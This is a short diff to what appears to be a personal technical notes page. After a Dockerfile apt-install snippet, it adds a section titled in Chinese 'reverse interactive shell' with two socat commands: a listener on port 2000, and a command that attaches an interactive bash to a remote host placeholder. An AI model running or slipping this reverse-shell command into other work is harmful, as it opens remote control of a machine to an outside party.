@@ -70,3 +70,13 @@ RUN apt update \
     && apt install -y --no-install-recommends xxx \
     && rm -rf /var/lib/apt/lists/*
 }}}
+
+=== 反弹交互式 shell ===
+
+{{{sh
+socat file:`tty`,raw,echo=0 tcp-listen:2000
+}}}
+
+{{{sh
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:DOMAIN-NAME-OR-IP:2000
+}}}
